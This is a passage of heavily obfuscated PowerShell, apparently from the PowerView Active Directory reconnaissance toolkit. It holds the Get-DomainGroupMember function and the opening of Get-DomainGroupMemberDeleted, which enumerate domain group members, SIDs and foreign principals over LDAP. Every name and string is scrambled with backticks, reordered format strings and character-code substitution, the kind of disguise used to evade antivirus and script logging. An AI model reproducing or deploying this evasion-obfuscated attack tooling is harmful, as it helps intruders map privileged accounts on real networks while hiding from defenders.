        [Alias({"{1}{0}{2}{3}"-f'shedN','Distingui','a','me'}, {"{1}{3}{2}{0}"-f 'ame','Sam','countN','Ac'}, {"{0}{1}"-f 'Na','me'}, {"{3}{1}{5}{4}{0}{2}" -f 'm','r','e','Membe','istinguishedNa','D'}, {"{0}{1}{2}" -f'M','emberN','ame'})]
        [String[]]
        ${I`d`E`NTITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAiN},

        [Parameter(pARaMETerSeTNaMe = "ma`NualrecU`RSe")]
        [Switch]
        ${Re`CuRSE},

        [Parameter(ParametErSetName = "Re`Cu`RSeUsing`MatchiNgRU`Le")]
        [Switch]
        ${R`eCu`RSe`USiNgMAtch`inGrULe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'F','ilter'})]
        [String]
        ${l`D`APfI`lter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'SPath','AD'})]
        [String]
        ${SeAr`chBa`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}"-f 'er','inC','Doma','ontroll'})]
        [String]
        ${S`erv`eR},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{2}{1}{0}" -f 'vel','Le','One'}, {"{0}{2}{1}"-f'Subt','e','re'})]
        [String]
        ${searc`HS`CoPE} = ("{1}{0}" -f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`suLT`Pa`GesiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`ertI`Me`LiMIT},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{0}{1}"-f'Gr','oup'}, {"{0}{1}"-f'Non','e'}, {"{1}{0}" -f 'ner','Ow'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${SECu`RIt`Y`m`AsKS},

        [Switch]
        ${TOMb`STo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`edEnT`IAL} =  ${pk`Fe`Zn}::"em`pTY"
    )

    BEGIN {
        ${s`eaRCH`eRar`G`Ume`NTS} = @{
            ("{1}{2}{0}" -f 'es','Prope','rti') = ("{1}{8}{0}{3}{2}{4}{5}{7}{6}" -f 'r,','memb','ntna','samaccou','me,distin','g','e','uishednam','e')
        }
        if (${PsboUN`DP`AR`AmEt`ers}[("{0}{1}"-f 'Doma','in')]) { ${SEa`R`Che`Rar`gU`mENTs}[("{0}{1}"-f'D','omain')] = ${DOmA`In} }
        if (${pSBouNdp`Ara`mE`Te`RS}[("{0}{2}{1}{3}" -f 'L','PF','DA','ilter')]) { ${s`eaR`c`hERa`Rg`UMEntS}[("{1}{0}{2}"-f 'Filt','LDAP','er')] = ${l`D`APFiL`TEr} }
        if (${PS`BouN`D`P`ARaMEt`eRs}[("{0}{2}{1}"-f 'Search','e','Bas')]) { ${SE`ARchE`R`A`RG`UmenTs}[("{0}{2}{1}" -f 'Searc','ase','hB')] = ${sea`Rch`B`ASE} }
        if (${pSBOU`Ndpa`R`A`METERS}[("{0}{1}" -f 'Se','rver')]) { ${sE`A`Rc`heRARGUM`EN`TS}[("{1}{2}{0}"-f'ver','S','er')] = ${seR`V`er} }
        if (${P`sb`OuNDPARamE`Ters}[("{1}{2}{0}" -f 'ope','Sea','rchSc')]) { ${SearCh`eRAR`GuME`NTS}[("{1}{2}{3}{0}"-f 'ope','Sear','c','hSc')] = ${sEaRCH`Sco`pe} }
        if (${pS`BOu`ND`pAram`ETERS}[("{0}{1}{2}" -f 'Re','su','ltPageSize')]) { ${se`ARCHEr`A`R`GU`mENtS}[("{0}{1}{2}{4}{3}" -f 'R','esu','ltPag','Size','e')] = ${RE`SULTp`AgEs`I`ze} }
        if (${PSbOuNd`P`A`RamEtE`Rs}[("{2}{1}{3}{0}" -f 't','rT','Serve','imeLimi')]) { ${SEAr`Ch`e`RARGUMENTS}[("{2}{1}{4}{0}{3}"-f'i','r','Serve','mit','TimeL')] = ${sE`RvE`RTI`Me`LImIt} }
        if (${PS`BoU`Nd`p`AraMe`Ters}[("{1}{0}" -f 'e','Tombston')]) { ${SeaRCh`E`RarguMe`N`TS}[("{0}{2}{1}" -f'Tomb','one','st')] = ${t`omb`stOne} }
        if (${p`sbO`UNDPaRa`M`eTErs}[("{1}{0}{2}" -f'tia','Creden','l')]) { ${SeA`RCheRAR`G`U`meN`Ts}[("{1}{2}{0}"-f'ial','Creden','t')] = ${c`RedENT`Ial} }

        ${A`dN`A`mEArgu`MENTs} = @{}
        if (${p`Sb`OUNd`PARAMe`TERs}[("{2}{0}{1}" -f'ai','n','Dom')]) { ${AdnAMeAR`guM`E`NTS}[("{1}{0}"-f 'in','Doma')] = ${dOM`A`In} }
        if (${p`S`Bound`paRAMETerS}[("{0}{1}" -f'Serv','er')]) { ${AdNa`MEarG`U`MeN`Ts}[("{1}{0}"-f 'r','Serve')] = ${SErv`er} }
        if (${pS`BO`UNd`para`m`eterS}[("{2}{1}{3}{0}"-f 'tial','ed','Cr','en')]) { ${a`dna`mEaRg`Um`entS}[("{1}{3}{0}{2}" -f'i','Crede','al','nt')] = ${CREde`N`TIAL} }
    }

    PROCESS {
        ${G`RO`Up`SeArc`her} = &("{0}{3}{2}{4}{1}"-f 'Get-Do','er','i','ma','nSearch') @SearcherArguments
        if (${GrO`UP`SEaRC`h`er}) {
            if (${PsBouND`p`A`RAMeT`e`Rs}[("{3}{1}{0}{5}{2}{4}{7}{6}"-f 'eUs','s','ngMa','Recur','tchingR','i','le','u')]) {
                ${SeARchEra`RgU`meN`TS}[("{2}{1}{0}" -f'y','ntit','Ide')] = ${i`d`ENtiTy}
                ${sEaRcHeRA`Rg`UMEn`Ts}['Raw'] = ${tR`UE}
                ${g`RoUP} = &("{0}{2}{1}" -f'Get-Domain','oup','Gr') @SearcherArguments

                if (-not ${G`RO`UP}) {
                    &("{1}{2}{0}"-f 'Warning','Writ','e-') ('[Get'+'-D'+'om'+'ainGro'+'upMember'+']'+' '+'E'+'rr'+'or '+'searchin'+'g'+' '+'fo'+'r '+'gr'+'oup '+'wit'+'h '+'id'+'entity:'+' '+"$Identity")
                }
                else {
                    ${G`R`ou`pFoundnA`Me} = ${G`RoUP}."Pr`op`eRti`es".("{0}{1}"-f'ite','m').Invoke(("{3}{2}{0}{1}"-f'accountn','ame','am','s'))[0]
                    ${grOUp`FoUN`DDN} = ${g`ROUP}."p`R`OpertIes".("{0}{1}"-f 'i','tem').Invoke(("{2}{0}{3}{1}" -f 'isting','me','d','uishedna'))[0]

                    if (${psbou`ND`PAr`AMet`eRS}[("{2}{0}{1}" -f'ma','in','Do')]) {
                        ${g`RO`UpF`OundDOma`iN} = ${dom`A`IN}
                    }
                    else {

                        if (${GrOupf`o`U`NDDN}) {
                            ${GRoUPf`ouN`ddOM`Ain} = ${G`Ro`UPf`OunddN}.("{2}{0}{1}"-f'bStrin','g','Su').Invoke(${GrOuP`F`OUNdDN}.("{1}{2}{0}" -f'f','Index','O').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{1}{0}{2}"-f 'ite-Verbo','Wr','se') ('['+'G'+'et'+'-D'+'omai'+'nGr'+'oupMember] '+'Using'+' '+'L'+'DAP '+'mat'+'ch'+'ing '+'r'+'ule '+'t'+'o '+'re'+'cu'+'rse '+'on'+' '+"'$GroupFoundDN', "+'onl'+'y '+'us'+'er '+'a'+'c'+'counts '+'wi'+'ll '+'b'+'e '+'returne'+'d'+'.')
                    ${gROu`pSE`A`RcHeR}."F`Il`TeR" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${G`RoUpse`ArCheR}."pRoPER`TiEst`Olo`AD".("{0}{1}{2}"-f'Add','Rang','e').Invoke((("{1}{3}{0}{4}{2}" -f'ishedNa','d','e','istingu','m')))
                    ${memB`E`RS} = ${gRoupSE`ARcH`er}.("{1}{0}{2}" -f'in','F','dAll').Invoke() | &("{3}{1}{2}{0}" -f't','Each-','Objec','For') {${_}."P`R`oPerT`IEs"."d`ISTiNg`Uished`NaME"[0]}
                }
                ${nu`lL} = ${sEARC`heRA`RGUM`E`NTs}.("{1}{2}{0}"-f'e','Remo','v').Invoke('Raw')
            }
            else {
                ${idENT`I`TYFIlT`Er} = ''
                ${FI`L`TEr} = ''
                ${IdE`Nt`i`TY} | &("{0}{1}{2}"-f'Wher','e-Obj','ect') {${_}} | &("{2}{1}{0}" -f 'Object','ch-','ForEa') {
                    ${ide`N`TITY`i`NS`TAnce} = ${_}.("{1}{0}"-f 'eplace','R').Invoke('(', '\28').("{0}{2}{1}"-f 'R','ace','epl').Invoke(')', '\29')
                    if (${iDen`TItYI`NS`T`A`NCe} -match ("{1}{0}" -f'1-','^S-')) {
                        ${i`den`Ti`TYFI`lTer} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${i`DEntit`YiN`STA`Nce} -match ("{0}{1}" -f'^C','N=')) {
                        ${Id`ENTi`Ty`Fi`ltEr} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${p`sBOuNDpa`Ra`mEt`ers}[("{1}{0}"-f'main','Do')]) -and (-not ${ps`Bou`NDp`ARAMeteRs}[("{3}{1}{0}{2}"-f'archBas','e','e','S')])) {

                            ${i`dEN`T`ItyD`OmAIn} = ${id`E`N`Tityin`s`TANce}.("{1}{3}{2}{0}"-f 'ing','S','tr','ubS').Invoke(${I`deN`TiTYiN`stanCE}.("{0}{1}" -f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{0}{1}" -f'b','ose','Write-Ver') ('[Get'+'-Doma'+'i'+'nGroupM'+'em'+'ber] '+'Ex'+'t'+'racted'+' '+'domai'+'n '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${SeA`RcHE`Ra`RGumen`Ts}[("{0}{1}{2}" -f 'D','o','main')] = ${IDEN`Ti`Ty`dom`Ain}
                            ${GRo`UpseA`RCHeR} = &("{4}{0}{2}{5}{3}{1}" -f'e','er','t-DomainSe','rch','G','a') @SearcherArguments
                            if (-not ${g`ROUp`sEARcHer}) {
                                &("{1}{2}{0}"-f'ng','Wri','te-Warni') ('[Ge'+'t'+'-DomainG'+'roupMe'+'mber] '+'Unabl'+'e '+'t'+'o '+'ret'+'rie'+'ve '+'doma'+'in '+'se'+'arc'+'her '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${idEnT`iTY`IN`STAnCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${g`Uid`B`YTe`sTrinG} = (([Guid]${ID`ENtitYi`Ns`TanCE}).("{2}{1}{3}{0}"-f'y','yte','ToB','Arra').Invoke() | &("{1}{0}{2}"-f'ach-Obje','ForE','ct') { '\' + ${_}.("{0}{1}{2}"-f 'ToS','tr','ing').Invoke('X2') }) -join ''
                        ${IDE`N`Ti`TyfIltER} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${iD`enT`ityINst`AN`cE}.("{1}{0}" -f'ntains','Co').Invoke('\')) {
                        ${c`ONVeRtedi`dent`It`YInS`T`ANcE} = ${i`dE`NTiT`yiNS`TaNCE}.("{1}{0}{2}" -f'a','Repl','ce').Invoke('\28', '(').("{1}{0}"-f'e','Replac').Invoke('\29', ')') | &("{0}{3}{2}{1}"-f'C','DName','A','onvert-') -OutputType ("{2}{1}{0}" -f'onical','an','C')
                        if (${C`onverte`dI`De`NTit`Yi`NStanCe}) {
                            ${gro`UPd`O`Main} = ${con`VErTE`D`IdEntit`yInSTAnCe}.("{1}{0}{2}" -f'Stri','Sub','ng').Invoke(0, ${ConVErtEd`i`d`eNT`I`TYi`NsTANCe}.("{1}{0}" -f'xOf','Inde').Invoke('/'))
                            ${G`RoU`pNamE} = ${iD`En`TI`TY`insta`NcE}.("{0}{1}"-f 'Spli','t').Invoke('\')[1]
                            ${IdEnt`I`Ty`FIl`TER} += "(samAccountName=$GroupName)"
                            ${sEarC`h`E`R`ARgUm`eNts}[("{0}{1}"-f 'Dom','ain')] = ${Gr`Ou`PDoMAIN}
                            &("{3}{0}{1}{2}"-f 'o','s','e','Write-Verb') ('[Get-Domain'+'G'+'r'+'oupMem'+'ber]'+' '+'Ex'+'t'+'ra'+'cted '+'dom'+'ain'+' '+"'$GroupDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${Gr`OupS`eArChEr} = &("{0}{2}{4}{1}{3}" -f'Get-Doma','h','i','er','nSearc') @SearcherArguments
                        }
                    }
                    else {
                        ${Ide`NT`it`yFi`lTeR} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${iden`TITY`F`ilTER} -and (${iDENt`I`TYf`ilter}.("{0}{1}"-f 'Tr','im').Invoke() -ne '') ) {
                    ${f`ilTer} += "(|$IdentityFilter)"
                }

                if (${ps`B`OundPARA`MEt`ErS}[("{0}{2}{1}" -f 'LD','r','APFilte')]) {
                    &("{0}{2}{3}{1}"-f 'Write-Ve','e','r','bos') ('[Get-'+'Domai'+'nG'+'r'+'oupMem'+'ber] '+'Using'+' '+'addi'+'tio'+'nal'+' '+'LDA'+'P '+'fi'+'lt'+'er: '+"$LDAPFilter")
                    ${fi`ltER} += "$LDAPFilter"
                }

                ${g`R`o`U`pSeARcheR}."F`ilT`ER" = "(&(objectCategory=group)$Filter)"
                &("{2}{1}{0}"-f'se','-Verbo','Write') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${r`Esu`lT} = ${g`Ro`UPSeaRch`eR}.("{1}{0}"-f'ndOne','Fi').Invoke()
                }
                catch {
                    &("{1}{0}{2}{3}" -f 'te-','Wri','W','arning') ('['+'Get-Doma'+'in'+'GroupMe'+'mber'+'] '+'Erro'+'r '+'searc'+'hi'+'ng '+'for'+' '+'grou'+'p'+' '+'with'+' '+'identi'+'ty '+"'$Identity': "+"$_")
                    ${M`eMB`ers} = @()
                }

                ${gr`OUPfo`U`NdN`AmE} = ''
                ${G`RoUP`FOUnDDN} = ''

                if (${R`EsULt}) {
                    ${m`e`MbeRS} = ${RESU`lt}."Pr`OPeR`Ties".("{0}{1}" -f 'it','em').Invoke(("{1}{0}" -f 'r','membe'))

                    if (${m`EMBe`RS}."cOU`Nt" -eq 0) {

                        ${Fi`NishEd} = ${fA`lse}
                        ${bOt`TOm} = 0
                        ${T`Op} = 0

                        while (-not ${fInI`sH`ED}) {
                            ${t`Op} = ${B`otT`OM} + 1499
                            ${mEm`B`Err`ANge}="member;range=$Bottom-$Top"
                            ${b`oTtom} += 1500
                            ${Nu`LL} = ${GroUP`s`earc`her}."prOP`ERTieSTO`l`o`AD".("{1}{0}"-f 'lear','C').Invoke()
                            ${N`UlL} = ${gROU`pseA`RcheR}."PR`oPErTIeS`TOL`OAD".("{0}{1}"-f'A','dd').Invoke("$MemberRange")
                            ${n`UlL} = ${grOUPSEARC`h`er}."pr`OpeRTie`st`OLOaD".("{0}{1}" -f'A','dd').Invoke(("{3}{1}{2}{0}" -f 'e','count','nam','samac'))
                            ${n`UlL} = ${GRouP`s`Ear`ChEr}."Prop`E`RTIe`sTolo`Ad".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}{3}" -f 'ednam','sh','distingui','e'))

                            try {
                                ${ReSU`Lt} = ${G`Roup`SEArCh`eR}.("{0}{1}" -f'F','indOne').Invoke()
                                ${raNgEdp`RoPE`R`TY} = ${r`eSU`LT}."p`ROpErt`IeS"."p`R`OpertYNa`m`es" -like ("{1}{3}{0}{2}" -f'ran','me','ge=*','mber;')
                                ${MEMb`e`Rs} += ${RES`Ult}."pRo`pe`RtIES".("{1}{0}" -f 'm','ite').Invoke(${Ra`NgEdPrOp`E`Rty})
                                ${grOUP`F`ouNDNa`ME} = ${RE`sU`lT}."pRo`P`ErTI`Es".("{1}{0}" -f'tem','i').Invoke(("{3}{1}{0}{2}"-f'oun','acc','tname','sam'))[0]
                                ${GRou`P`F`OUNddn} = ${R`E`sulT}."p`Ro`PE`Rties".("{0}{1}" -f'i','tem').Invoke(("{0}{5}{1}{2}{3}{4}"-f'd','stinguis','he','dn','ame','i'))[0]

                                if (${me`mbE`Rs}."co`UNT" -eq 0) {
                                    ${FI`N`ished} = ${T`RUE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${fi`NIS`hEd} = ${tr`UE}
                            }
                        }
                    }
                    else {
                        ${GROuPfo`UN`dNA`me} = ${re`S`UlT}."pRo`Pe`R`TIEs".("{0}{1}"-f 'i','tem').Invoke(("{1}{3}{2}{0}{4}" -f 'n','sa','nt','maccou','ame'))[0]
                        ${GROU`PF`o`U`NdDN} = ${rES`Ult}."pRoP`er`TIEs".("{1}{0}" -f 'm','ite').Invoke(("{3}{2}{1}{0}" -f'e','m','stinguishedna','di'))[0]
                        ${mEm`BE`RS} += ${R`esU`lT}."p`R`op`eRtiES".("{1}{0}"-f'em','it').Invoke(${rangeDp`ROP`e`Rty})
                    }

                    if (${ps`B`ouNDpaR`AM`ETERS}[("{0}{1}"-f 'Domai','n')]) {
                        ${g`R`ou`pfO`Und`DOMaIn} = ${Do`MaIn}
                    }
                    else {

                        if (${grouPfO`UN`Ddn}) {
                            ${gRo`U`pfoUND`DOm`AIn} = ${gRou`PF`OUNdDn}.("{2}{0}{1}" -f 'in','g','SubStr').Invoke(${grOUp`FO`UNdDn}.("{1}{0}" -f'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${mE`M`Ber} in ${mEm`B`ers}) {
                if (${r`e`cuRSE} -and ${USE`MaT`ch`ingRUlE}) {
                    ${prop`e`Rti`es} = ${_}."prOpER`T`i`Es"
                }
                else {
                    ${obj`ECTsE`A`RcH`ERA`Rgu`Ments} = ${s`Ea`RcH`erAR`G`Uments}.("{1}{0}"-f 'lone','C').Invoke()
                    ${obje`cts`EArc`H`ERaRgUments}[("{1}{2}{0}" -f 'tity','Ide','n')] = ${Mem`Ber}
                    ${OBJEC`Ts`Ea`RChEr`A`RGUMe`NTs}['Raw'] = ${TR`Ue}
                    ${ob`Ject`Se`AR`Che`Rargu`mEnTs}[("{2}{1}{0}" -f's','rtie','Prope')] = ("{8}{9}{5}{0}{6}{3}{7}{1}{2}{10}{4}"-f'in',',obj','ect','uishedname,','ss','st','g','cn,samaccountname','d','i','sid,objectcla')
                    ${OBJ`eCt} = &("{1}{2}{4}{0}{3}"-f'jec','Get','-Dom','t','ainOb') @ObjectSearcherArguments
                    ${PROp`E`RtIeS} = ${ObJe`Ct}."pROP`eRTI`ES"
                }

                if (${pro`PEr`TIes}) {
                    ${Gr`o`U`pmembEr} = &("{3}{2}{1}{0}"-f 'ject','w-Ob','e','N') ("{0}{1}{2}"-f'PSObj','ec','t')
                    ${gR`OUPme`mbeR} | &("{2}{1}{0}"-f'ber','m','Add-Me') ("{0}{2}{3}{1}" -f 'N','rty','ot','eprope') ("{1}{0}{2}"-f 'oupDomai','Gr','n') ${gRo`U`P`FoUnDdomAIN}
                    ${g`RoUPm`Emb`Er} | &("{1}{2}{0}" -f'mber','Add-','Me') ("{0}{2}{1}{3}"-f'No','o','tepr','perty') ("{1}{0}{2}" -f 'roupNa','G','me') ${GrO`U`PFOuNDn`A`me}
                    ${GroU`P`MeM`BER} | &("{2}{1}{0}"-f'Member','d-','Ad') ("{1}{3}{0}{2}"-f't','Notep','y','roper') ("{4}{2}{6}{3}{5}{1}{0}" -f'me','hedNa','oupD','sti','Gr','nguis','i') ${grO`U`p`FOund`Dn}

                    if (${pRO`p`e`RtIeS}."O`B`JeCTsiD") {
                        ${mEMbEr`S`ID} = ((&("{0}{1}{2}" -f'New-','Obj','ect') ("{12}{9}{11}{8}{6}{1}{2}{13}{5}{10}{4}{0}{7}{3}"-f 'yIden','.P','ri','ier','rit','al.Sec','y','tif','curit','S','u','e','System.','ncip') ${P`R`OPErTIes}."ObJeC`TS`iD"[0], 0)."V`Alue")
                    }
                    else {
                        ${me`Mbe`R`SId} = ${N`ULl}
                    }

                    try {
                        ${meM`B`eRDN} = ${Pr`O`PE`RtiEs}."D`I`sT`Ing`UISh`EdNAMe"[0]
                        if (${mEm`BE`Rdn} -match ((("{3}{5}{4}{6}{0}{1}{2}{9}{7}{8}"-f 'c','urityPr','in','Fore','gnS','i','e','palsKICS-1-5-','21','ci'))-rePlaCe([cHar]75+[cHar]73+[cHar]67),[cHar]124)) {
                            try {
                                if (-not ${M`e`mbErsId}) {
                                    ${mEmB`E`RSID} = ${pr`o`per`TIES}."CN"[0]
                                }
                                ${mE`m`Ber`s`IMPl`ENAmE} = &("{3}{1}{4}{0}{2}" -f 'D','on','Name','C','vert-A') -Identity ${mem`BERs`id} -OutputType ("{0}{1}{3}{2}" -f 'Dom','ainSim','le','p') @ADNameArguments

                                if (${mE`Mbersim`PlE`NAMe}) {
                                    ${memB`E`RdomaIn} = ${m`e`M`BerSIMplenAme}.("{0}{1}"-f'Sp','lit').Invoke('@')[1]
                                }
                                else {
                                    &("{0}{2}{1}" -f'Wr','e-Warning','it') ('[G'+'et-Do'+'ma'+'in'+'GroupMembe'+'r] '+'Error'+' '+'c'+'o'+'nverting '+"$MemberDN")
                                    ${mem`Be`RD`o`maiN} = ${NU`ll}
                                }
                            }
                            catch {
                                &("{1}{0}{2}"-f'rit','W','e-Warning') ('[Ge'+'t'+'-'+'Do'+'mainG'+'roupMember] '+'Er'+'ro'+'r '+'c'+'onve'+'r'+'ting '+"$MemberDN")
                                ${mEM`B`ER`dOmAIn} = ${nu`Ll}
                            }
                        }
                        else {

                            ${MEmB`e`RDoM`AiN} = ${ME`MbER`dn}.("{1}{0}" -f'tring','SubS').Invoke(${meM`Be`RDn}.("{0}{1}" -f 'I','ndexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${m`Em`BeR`dn} = ${n`Ull}
                        ${M`emberD`OmAIN} = ${NU`ll}
                    }

                    if (${p`R`OPeR`TIes}."Sama`cc`ounTN`A`me") {

                        ${Me`MBE`R`NaME} = ${PRo`pERt`ieS}."sAMAc`COUNT`NaMe"[0]
                    }
                    else {

                        try {
                            ${M`e`MBe`RnAmE} = &("{3}{2}{4}{0}{1}" -f 'm-SI','D','nv','Co','ertFro') -ObjectSID ${Pr`oPer`Ti`eS}."c`N"[0] @ADNameArguments
                        }
                        catch {

                            ${ME`M`BeRn`AME} = ${pRO`P`eRtIES}."c`N"[0]
                        }
                    }

                    if (${PR`Oper`TIes}."OB`jeCt`CL`AsS" -match ("{1}{0}{2}"-f 'p','com','uter')) {
                        ${meMBeR`OBJ`ECt`C`lASS} = ("{0}{1}{2}" -f 'c','omput','er')
                    }
                    elseif (${pR`OPE`RTIeS}."ObJ`ectc`L`ASS" -match ("{1}{0}" -f'oup','gr')) {
                        ${m`EMBeR`Objec`T`clA`sS} = ("{1}{0}"-f'roup','g')
                    }
                    elseif (${P`R`oPERtIES}."OBJE`c`TclaSs" -match ("{1}{0}"-f 'ser','u')) {
                        ${m`e`MbErObjEct`CLASS} = ("{0}{1}" -f 'u','ser')
                    }
                    else {
                        ${mE`mBERo`BJeCTCL`A`sS} = ${nu`LL}
                    }
                    ${g`RoUP`MEM`BeR} | &("{1}{2}{0}"-f'mber','Add-','Me') ("{2}{0}{1}" -f 'eprop','erty','Not') ("{2}{0}{1}"-f 'be','rDomain','Mem') ${M`Emb`erD`omAiN}
                    ${GrO`Up`mEmbER} | &("{0}{1}{2}" -f'Add-Me','mbe','r') ("{2}{1}{0}" -f 'perty','tepro','No') ("{0}{1}{2}" -f 'Me','mber','Name') ${m`e`m`BerNAMe}
                    ${grou`p`m`eMBEr} | &("{2}{0}{1}"-f 'dd-Membe','r','A') ("{0}{3}{1}{2}"-f'N','ropert','y','otep') ("{2}{7}{5}{0}{4}{1}{3}{6}" -f't','nguishe','Mem','d','i','s','Name','berDi') ${m`e`mbERDn}
                    ${GrO`U`PM`EMbER} | &("{0}{2}{1}" -f'Add-','ber','Mem') ("{2}{1}{3}{0}"-f'property','o','N','te') ("{1}{2}{0}{3}" -f'e','Mem','berObj','ctClass') ${MeM`B`e`RobJ`ecTClAss}
                    ${GrO`UPmem`BEr} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{1}{3}{0}{2}" -f 'rt','Note','y','prope') ("{1}{0}{2}"-f'mber','Me','SID') ${m`em`BeRsID}
                    ${gRouP`Me`mBER}."P`soB`JEcT"."t`yPENA`MEs".("{2}{1}{0}" -f 't','ser','In').Invoke(0, ("{0}{4}{1}{3}{2}" -f 'Power','.Group','ember','M','View'))
                    ${gr`oU`PMem`BEr}

                    if (${p`SB`o`Undp`ARa`METERS}[("{0}{1}{2}" -f 'R','ec','urse')] -and ${MeM`Be`RdN} -and (${MemBE`RObjEc`T`CL`Ass} -match ("{1}{0}" -f 'p','grou'))) {
                        &("{0}{1}{2}"-f 'Write','-Verb','ose') ('[Get-'+'Domai'+'nG'+'r'+'ou'+'pMe'+'mber]'+' '+'M'+'anuall'+'y '+'rec'+'ursi'+'n'+'g '+'on'+' '+'group:'+' '+"$MemberDN")
                        ${sEA`RCh`e`RaRGUMe`N`Ts}[("{2}{0}{1}" -f'e','ntity','Id')] = ${M`em`BeRdn}
                        ${Nu`Ll} = ${SeArcH`er`ArG`UmENtS}.("{1}{2}{0}"-f 've','R','emo').Invoke(("{2}{0}{1}"-f'o','perties','Pr'))
                        &("{0}{5}{1}{6}{4}{3}{2}" -f'Get-Do','inG','er','upMemb','o','ma','r') @SearcherArguments
                    }
                }
            }
            ${groupsea`R`cheR}.("{2}{0}{1}" -f's','pose','di').Invoke()
        }
    }
}

function geT-`domAIN`GROUpME`mBE`Rd`eleT`ED {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{5}{4}{1}{2}{3}{6}" -f'PSUseD','sM','oreTh','anAs','laredVar','ec','signments'}, '')]
    [OutputType({"{9}{8}{5}{3}{0}{1}{6}{2}{4}{10}{7}" -f'n','GroupMemb','rD','i','e','werView.Doma','e','ed','o','P','let'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTioN = 0, ValuefRoMpiPElInE = ${t`Rue}, valUeFrOmPiPeLInEBypropERtYNAmE = ${tr`Ue})]
        [Alias({"{2}{3}{0}{1}" -f'inguished','Name','D','ist'}, {"{3}{0}{2}{1}"-f 'ccou','ame','ntN','SamA'}, {"{0}{1}"-f'Nam','e'}, {"{4}{0}{3}{2}{1}"-f'Disti','Name','ished','ngu','Member'}, {"{2}{0}{1}"-f 'mberNam','e','Me'})]
        [String[]]
        ${i`D`enTiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`Main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'ilte','r','F'})]
        [String]
        ${L`da`pfILT`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'AD','SPath'})]
        [String]
        ${sE`A`RCHbA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{1}{2}" -f 'omainCo','o','ller','ntr','D'})]
        [String]
        ${SER`VER},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{0}" -f 'eLevel','On'}, {"{1}{0}" -f 'tree','Sub'})]
        [String]
        ${SEaRChs`cO`pE} = ("{2}{0}{1}"-f 'tr','ee','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sul`T`paGe`SIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERV`eR`TIMEL`iMIT},

        [Switch]
        ${t`OMBstO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`denti`AL} =  ( &("{0}{1}"-f'VAr','IABlE') ('pKf'+'E'+'zN'))."va`lue"::"Emp`TY",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${SE`A`RCHErA`RG`UM`eNTS} = @{
            ("{0}{1}{2}"-f'Pro','perti','es')    =   ("{0}{1}{3}{4}{2}" -f'm','sds-r','emetadata','eplva','lu'),("{0}{3}{2}{1}"-f'distinguishe','e','nam','d')
            'Raw'           =   ${tr`UE}
            ("{1}{2}{0}" -f'er','LDAPFi','lt')    =   (("{3}{2}{4}{0}{1}" -f 'Category=group',')','ob','(','ject'))
        }
        if (${PSBOUnd`Para`me`TErS}[("{1}{0}"-f'ain','Dom')]) { ${Se`A`R`cHe`RARgUmEnts}[("{1}{0}"-f 'n','Domai')] = ${D`o`main} }
        if (${Ps`B`OUNDpa`RAMeT`Ers}[("{0}{3}{1}{2}" -f'L','i','lter','DAPF')]) { ${seARc`H`eR`ArgUmENTs}[("{2}{0}{1}" -f'ilt','er','LDAPF')] = ${L`daPfil`TEr} }
        if (${P`SBo`UNdP`ARamet`ers}[("{2}{0}{1}" -f'earchB','ase','S')]) { ${s`eA`RcH`ER`Ar`gumenTS}[("{2}{1}{0}" -f 'chBase','ear','S')] = ${s`eARc`HbASE} }
        if (${PS`B`oundpAR`AM`eTERs}[("{1}{0}"-f'r','Serve')]) { ${se`A`RCH`erA`RgUmENTs}[("{0}{1}"-f 'S','erver')] = ${Se`RveR} }
        if (${P`SbO`UNdPaR`A`metE`RS}[("{0}{3}{1}{2}" -f 'S','hSco','pe','earc')]) { ${SEAR`CHER`ARgu`Me`NTs}[("{1}{0}{2}"-f 'earc','S','hScope')] = ${Sea`R`chScOPE} }
        if (${PsB`OUNd`P`ARaMET`ers}[("{0}{1}{2}"-f'Re','sultPageSiz','e')]) { ${SeARChE`Ra`RgU`mEN`Ts}[("{0}{2}{3}{1}" -f 'Resu','ize','ltP','ageS')] = ${rEs`U`ltPageSi`ZE} }
